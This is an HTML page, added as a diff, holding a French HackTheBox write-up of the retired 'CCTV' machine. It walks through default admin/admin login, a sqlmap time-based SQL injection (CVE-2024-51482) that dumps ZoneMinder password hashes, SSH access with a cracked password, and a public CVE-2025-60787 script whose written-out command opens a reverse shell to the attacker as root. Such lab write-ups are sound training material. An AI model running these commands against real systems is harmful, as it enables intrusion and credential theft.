@@ -1,0 +1,158 @@
+<!doctype html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="description" content="Write-up HackTheBox CCTV par Mohamed GAIGI (Nekros00).">
+<title>CCTV · Write-up HTB</title>
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=IBM+Plex+Sans:wght@400;500;600&display=swap">
+<style>
+:root{color-scheme:dark;--bg:#0a0e12;--bg-elev:#11161c;--bg-elev2:#161d25;--border:#202c36;
+--border-bright:#2c3d49;--text:#c9d4dc;--text-dim:#728593;--text-faint:#4a5964;
+--accent:#5a9fdd;--brand:#1B4F9B;--accent-2:#6fb3f3;--accent-3:#ff6b8a;--warn:#ffb454;--crit:#ff5f6b;
+--mono:"JetBrains Mono",ui-monospace,Menlo,Consolas,monospace;--sans:"IBM Plex Sans",system-ui,-apple-system,Segoe UI,sans-serif;}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--text);font-family:var(--sans);font-size:15.5px;line-height:1.7;-webkit-font-smoothing:antialiased;
+background-image:radial-gradient(ellipse 80% 40% at 50% -10%,rgba(90,159,221,.08),transparent 60%),linear-gradient(var(--bg),var(--bg));background-attachment:fixed;}
+a{color:var(--accent-2);text-decoration:none}a:hover{text-decoration:underline}
+::selection{background:rgba(27,79,155,.5);color:#fff}
+.wrap{max-width:820px;margin:0 auto;padding:0 20px}
+nav{position:sticky;top:0;z-index:20;background:rgba(10,14,18,.85);backdrop-filter:blur(10px);border-bottom:1px solid var(--border)}
+.nav-in{max-width:820px;margin:0 auto;padding:12px 20px;display:flex;gap:16px;align-items:center;font-family:var(--mono);font-size:13px}
+.nav-in a{color:var(--text-dim)}.nav-in a:hover{color:var(--accent);text-decoration:none}
+header.hd{padding:46px 0 26px;border-bottom:1px solid var(--border);margin-bottom:30px}
+.eyebrow{font-family:var(--mono);font-size:12px;letter-spacing:1.3px;text-transform:uppercase;color:var(--accent);margin:0 0 8px}
+.eyebrow::before{content:"// ";color:var(--text-faint)}
+h1{font-family:var(--mono);font-size:clamp(26px,5vw,38px);font-weight:700;letter-spacing:-.5px;margin:0 0 12px;color:var(--text);text-wrap:balance}
+.meta{font-family:var(--mono);font-size:13px;color:var(--text-dim);display:flex;gap:14px;flex-wrap:wrap;align-items:center}
+.meta .os-win{color:var(--accent)}.meta .os-lin{color:var(--accent-2)}
+.meta .chip{color:var(--accent);background:rgba(90,159,221,.12);border:1px solid rgba(90,159,221,.38);border-radius:5px;padding:2px 9px}
+article h1{font-size:24px;margin:34px 0 6px}
+article h2{font-family:var(--mono);font-size:20px;font-weight:700;color:var(--text);margin:36px 0 6px;padding-top:10px;border-top:1px solid var(--border)}
+article h3{font-family:var(--mono);font-size:16px;font-weight:600;color:var(--accent);margin:26px 0 4px}
+article h4{font-family:var(--mono);font-size:14px;font-weight:600;color:var(--text-dim);margin:20px 0 2px}
+article p{margin:12px 0}
+article ul,article ol{padding-left:22px;margin:12px 0}article li{margin:5px 0}
+article img{max-width:100%;border:1px solid var(--border-bright);border-radius:8px;margin:14px 0;display:block}
+code{font-family:var(--mono);font-size:.88em;background:var(--bg-elev2);border:1px solid var(--border);border-radius:4px;padding:1px 6px;color:var(--accent-2)}
+pre{background:#0c1116;border:1px solid var(--border-bright);border-radius:9px;padding:16px 18px;overflow-x:auto;margin:16px 0}
+pre code{background:none;border:none;padding:0;color:#c9d4dc;font-size:13px;line-height:1.6}
+blockquote{margin:16px 0;padding:12px 16px;background:var(--bg-elev2);border:1px solid var(--border);border-left:3px solid var(--warn);border-radius:8px;color:var(--text-dim)}
+blockquote p{margin:4px 0}
+table{border-collapse:collapse;width:100%;margin:16px 0;font-size:14px;display:block;overflow-x:auto}
+th,td{border:1px solid var(--border);padding:8px 12px;text-align:left}
+th{background:var(--bg-elev2);font-family:var(--mono);color:var(--accent);font-weight:600}
+tr:nth-child(even) td{background:rgba(255,255,255,.015)}
+hr{border:none;border-top:1px solid var(--border);margin:26px 0}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:16px;margin-top:8px}
+.wu{display:block;background:var(--bg-elev);border:1px solid var(--border);border-radius:10px;padding:18px 20px;color:inherit}
+.wu:hover{border-color:var(--accent);text-decoration:none}
+.wu-top{display:flex;justify-content:space-between;align-items:center;gap:10px;margin-bottom:6px}
+.wu-name{font-family:var(--mono);font-weight:600;font-size:17px;color:var(--text)}
+.wu .chip{font-family:var(--mono);font-size:11px;color:var(--accent);background:rgba(90,159,221,.12);border:1px solid rgba(90,159,221,.38);border-radius:5px;padding:2px 9px}
+.wu .m{font-family:var(--mono);font-size:12px;color:var(--text-dim)}.wu .m .os-lin{color:var(--accent-2)}.wu .m .os-win{color:var(--accent)}
+.wu p{color:var(--text-dim);font-size:14px;margin:8px 0 0}
+footer{padding:34px 20px 50px;text-align:center;color:var(--text-faint);font-family:var(--mono);font-size:12px;border-top:1px solid var(--border);margin-top:40px}
+footer a{color:var(--text-dim)}
+</style>
+</head>
+<body>
+<nav><div class="nav-in"><a href="../index.html">← portfolio</a><a href="index.html">./writeups</a></div></nav>
+<header class="hd wrap"><p class="eyebrow">write-up</p><h1>CCTV</h1><div class="meta"><span class="os-lin">● Linux</span><span class="chip">retired</span></div></header><article class="wrap"><p><img alt="" src="img/Pasted_image_20260326174145.png" /></p>
+<p>quand on part sur le port 80 </p>
+<p><img alt="" src="img/Pasted_image_20260326175257.png" /></p>
+<p><img alt="" src="img/Pasted_image_20260326175325.png" /><br />
+quand j'ai appuyé sur le staff login, j'ai eu une page de connexion et j'ai pu me connecter avec les credentials admin/admin</p>
+<p>sur la page admin on voit la version de ZoneMinder qui est '1. 37.63' et on trouve cette CVE-2024-51482 pour cette version <br />
+<img alt="" src="img/Pasted_image_20260326181000.png" /></p>
+<p>après avoir cherché exploit 'CVE-2024-51482', j'ai trouvé ce repo sur github : https://github.com/BridgerAlderson/CVE-2024-51482/blob/main/README.md<br />
+j'ai cloné le repo sur ma vm </p>
+<p><img alt="" src="img/Pasted_image_20260326183340.png" /><br />
+première commande pour voir si le site est vulnérable </p>
+<p><img alt="" src="img/Pasted_image_20260326190504.png" /><br />
+deuxième commande pour découvrir les bases de données existantes sur le site </p>
+<p><img alt="" src="img/Pasted_image_20260405010135.png" /></p>
+<p>la commande pour récupérer les hashs des mdp des 3 utilisateurs </p>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Explication</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-u "http://..."</code></td>
+<td>L'URL cible contenant le paramètre vulnérable. Ici le paramètre <code>tid=1</code> est celui qui est injecté - c'est lui que sqlmap va manipuler.</td>
+</tr>
+<tr>
+<td><code>-D zm</code></td>
+<td>On cible spécifiquement la base de données <code>zm</code> (ZoneMinder). Sans cette option sqlmap énumérerait toutes les bases.</td>
+</tr>
+<tr>
+<td><code>-T Users</code></td>
+<td>On cible la table <code>Users</code> dans la base <code>zm</code>.</td>
+</tr>
+<tr>
+<td><code>-C Username,Password</code></td>
+<td>On extrait uniquement ces deux colonnes pour aller vite. Sans <code>-C</code>, sqlmap dumperait toute la table.</td>
+</tr>
+<tr>
+<td><code>--dump</code></td>
+<td>Ordre d'extraire et d'afficher les données trouvées.</td>
+</tr>
+<tr>
+<td><code>--batch</code></td>
+<td>Mode non-interactif : sqlmap répond automatiquement "oui" à toutes ses propres questions. Utile pour éviter d'avoir à valider manuellement chaque étape.</td>
+</tr>
+<tr>
+<td><code>--dbms=MySQL</code></td>
+<td>On indique manuellement que le SGBD est MySQL. Cela évite à sqlmap de perdre du temps à "deviner" le type de base de données.</td>
+</tr>
+<tr>
+<td><code>--technique=T</code></td>
+<td>On force l'utilisation de la technique <strong>Time-based blind uniquement</strong> (T = Time). C'est la technique adaptée à ce type de vulnérabilité.</td>
+</tr>
+<tr>
+<td><code>--cookie="ZMSESSID=..."</code></td>
+<td>Le cookie de session admin obtenu après connexion avec <code>admin/admin</code>. Sans lui, sqlmap accèderait à des pages non authentifiées et ne trouverait pas la vulnérabilité.</td>
+</tr>
+<tr>
+<td><code>--time-sec=2</code></td>
+<td>Le délai en secondes utilisé pour les injections time-based. Si la requête prend &gt;2s c'est un "oui", sinon c'est un "non".</td>
+</tr>
+</tbody>
+</table>
+<p>résultat de la commande : <br />
+<img alt="" src="img/Pasted_image_20260405010658.png" /><br />
+on eu le hash des 3 utilisateurs </p>
+<p><img alt="" src="img/Pasted_image_20260405010734.png" /><br />
+on récupére le mdp de mark en clair pour pouvoir se co en ssh </p>
+<p><img alt="" src="img/Pasted_image_20260405011434.png" /><br />
+grâce au mdp récupéré en clair on a pu accéder a la machine de mark en ssh et je regarde les ports ouverts en local (qu'on ne voit pas depuis l'extérieur)</p>
+<p><img alt="" src="img/Pasted_image_20260405154913.png" /></p>
+<p><img alt="" src="img/Pasted_image_20260405155232.png" /><br />
+grâce a cette commande j'ai pu voir qu'il y avait des fichiers conf pour chaque caméra : <br />
+<img alt="" src="img/Pasted_image_20260405155323.png" /></p>
+<p><img alt="" src="img/Pasted_image_20260405235828.png" /><br />
+grâce a la commande précédente j'ai pu me co avec le compte admin sur l'interface de motionEye<br />
+<img alt="" src="img/Pasted_image_20260406003840.png" /><br />
+quand j'ai vu qu'il y avait une caméra sur l'interface web je suis parti chercher si je pouvais trouver quelque chose d'intéressant dans le répertoire de la caméra1 et ça n'a pas manqué car un utilisateur a déjà exécuté des commandes pour faire du reverse shell dans les champs <code>picture_filename</code> et <code>snapshot_filename</code>.</p>
+<p><img alt="" src="img/Pasted_image_20260406000441.png" /></p>
+<p>en me connectant a l'interface de motionEye j'ai chercher la version de l'outil pour pouvoir chercher si y a un exploit sur internet et j'ai trouvé ce github : https://github.com/gunzf0x/CVE-2025-60787<br />
+Ce CVE injecte dans les 2 champs comme ce qu'a fait l'utilisateur dans caméra 1.</p>
+<p>la commande par défaut pour faire ce reverse shell : <br />
+"python3 CVE-2025-60787.py revshell --url 'http://10.10.10.10:8765' --user 'admin' --password 'StrongPassw0rd123!' -i 10.10.10.15 --port 9001"</p>
+<p>la commande adapté a ma situation : <br />
+<img alt="" src="img/Pasted_image_20260406000952.png" /><br />
+j'ai précisé ce port le "4444" <br />
+<img alt="" src="img/Pasted_image_20260406001034.png" /><br />
+car j'ai ouvert ce port pour écouter sur un autre terminal </p>
+<p>après avoir lancé le script j'ai pu accéder a l'interface root de motionEye  <img alt="" src="img/Pasted_image_20260406001457.png" /></p>
+<p>en me connectant au l'utilisateur root j'ai pu récupérer le flag root : <br />
+<img alt="" src="img/Pasted_image_20260406001620.png" /></p>
+<p><img alt="" src="img/Pasted_image_20260406001711.png" /><br />
+ après avoir récup le flag admin je suis partie dans le répertoire de sa_mark pour récup le flag user</p></article>
+<footer>Mohamed GAIGI · HTB : Nekros00 · <a href="../index.html">retour au portfolio</a></footer>
+</body>
+</html>
